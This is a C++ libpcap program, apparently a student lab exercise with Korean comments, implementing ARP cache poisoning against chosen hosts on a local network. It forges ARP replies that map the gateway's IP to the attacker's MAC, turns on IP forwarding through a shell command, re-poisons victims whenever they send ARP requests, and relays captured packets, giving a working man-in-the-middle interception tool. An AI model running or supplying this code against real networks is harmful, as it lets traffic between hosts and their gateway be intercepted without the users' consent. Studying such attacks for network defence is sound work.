#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <thread>
#include <atomic>
#include <chrono>
#include <map>
#include <mutex>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1) //1바
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};  //ARP 헤더 패킷 구조체 정의
#pragma pack(pop)
//메모리 정렬
std::atomic<bool> stop_flag(false); // 종료 플래그 false 로 초기화
std::map<Ip, Ip> target_map; // 송신자 IP를 게이트웨이 IP에 매핑
std::mutex target_map_mutex; // 뮤텍스

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
} //사용 방법 프린트

Mac getAttackerMac(const char* dev) {
    struct ifreq ifr; //인터페이스 요청 구조체
    int fd = socket(AF_INET, SOCK_DGRAM, 0); //통신은 아닌데 소켓 생성
    if (fd < 0) { //실패하면 에러
        perror("socket");
        exit(1);
    }
    ifr.ifr_addr.sa_family = AF_INET; //주소 체계를 IPv4로 설정
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1); //인터페이스 이름
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    Mac attackerMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data); //MAC주소로 
    printf("Attacker MAC: %s\n", std::string(attackerMac).c_str()); //내 MAC 주소가 뭔지
    return attackerMac;
}

void sendArpSpoof(pcap_t* handle, Mac attackerMac, Ip senderIp, Ip targetIp) { //AP 스푸핑 패킷 보내는 함수
    EthArpPacket packet; //ARP 헤더를 포함하는 패킷 구조체 선언 
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //목적지 브로드캐스트
    packet.eth_.smac_ = attackerMac; //목적지 MAC을 Broadcast로
    packet.eth_.type_ = htons(EthHdr::Arp); //이더넷 타입을 ARP로 타입 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER); //하드 타입을 이더넷으로
    packet.arp_.pro_ = htons(EthHdr::Ip4); //프로토콜 타입 IPv4
    packet.arp_.hln_ = Mac::SIZE; //하드웨어 길이를 MAC 주소 크기로
    packet.arp_.pln_ = Ip::SIZE; // 프로토콜 길이를 IP 주소 크기로
    packet.arp_.op_ = htons(ArpHdr::Reply); //ARP 연산을 응답으로 설정
    packet.arp_.smac_ = attackerMac; //ARP 송신자 MAC 주소를 공격자의 MAC 주소로 설정
    packet.arp_.sip_ = htonl(targetIp); //게이트웨이 IP로 설정
    packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); //ARP 대상 MAC 주소를 브로드캐스트로
    packet.arp_.tip_ = htonl(senderIp); //ARP 대상 IP를 송신자 IP로 설정
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); //네트워크로 전송
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    } else {
        printf("ARP spoofing packet sent successfully to %s\n", std::string(senderIp).c_str());
    } //패킷 전송 결과
} 

void enableIpForwarding() {
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    printf("IP forwarding enabled\n");
} //시스템의 IP 포워딩을 활성화

void packetHandler(u_char *userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    // 패킷 포워딩
    pcap_t* handle = *((pcap_t**)userData);
    if (pcap_sendpacket(handle, packet, pkthdr->len) != 0) {
        fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(handle));
    } //캡처된 패킷을 포워딩
}

void broadcastDetectionThread(pcap_t* handle, Mac attackerMac) { //ARP 요청 감지하는 스레드 함수)
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    while (!stop_flag) { //false 로 설정 된 동안 
        int res = pcap_next_ex(handle, &header, &packet); //패킷 캡처
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* ethHdr = (EthHdr*)packet; //이더넷 파싱
        if (ntohs(ethHdr->type_) == EthHdr::Arp) {
            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
            if (ntohs(arpHdr->op_) == ArpHdr::Request) {
                Ip senderIp = ntohl(arpHdr->sip_);
                //ARP 요청의 송신자 IP를 추출
                std::lock_guard<std::mutex> lock(target_map_mutex); //뮤텍스
                auto it = target_map.find(senderIp);
                if (it != target_map.end()) { //IP가 target_map에 있는지 확인
                    printf("Broadcast ARP request detected from %s. Re-infecting...\n", std::string(senderIp).c_str());
                    sendArpSpoof(handle, attackerMac, senderIp, it->second); //다시 스푸핑 패킷 보내기
                }
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    printf("Interface: %s\n", dev);
    //인터페이스 출력해주고
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //패킷캡처 시작
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    Mac attackerMac = getAttackerMac(dev); //공격자 맥 MAC 가져오기
    
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip gatewayIp = Ip(argv[i+1]);
        {
            std::lock_guard<std::mutex> lock(target_map_mutex); //target_map에 대한 경쟁 방지 한번에 하나의 스레드
            target_map[senderIp] = gatewayIp;
        } //송신자랑 게이트웨이 IP 파싱 하고 뮤텍스
        printf("\nSending initial ARP spoof packet: Sender IP %s, Gateway IP %s\n", 
               std::string(senderIp).c_str(), std::string(gatewayIp).c_str());
        sendArpSpoof(handle, attackerMac, senderIp, gatewayIp);
    } //각 대상에 대해 초기 ARP 스푸핑 패킷을 전송
    
    enableIpForwarding(); //시스템의 IP 포워딩 활성화
    
    printf("Starting broadcast detection thread and packet forwarding...\n");
    
    // 브로드캐스트 감지 스레드 시작
    std::thread detection(broadcastDetectionThread, handle, attackerMac);
    
    // 메인 스레드에서 패킷 포워딩 수행
    pcap_loop(handle, 0, packetHandler, (u_char*)&handle); //무한
    
    // 정리
    stop_flag = true;
    detection.join();
    pcap_close(handle);
    return 0;
}
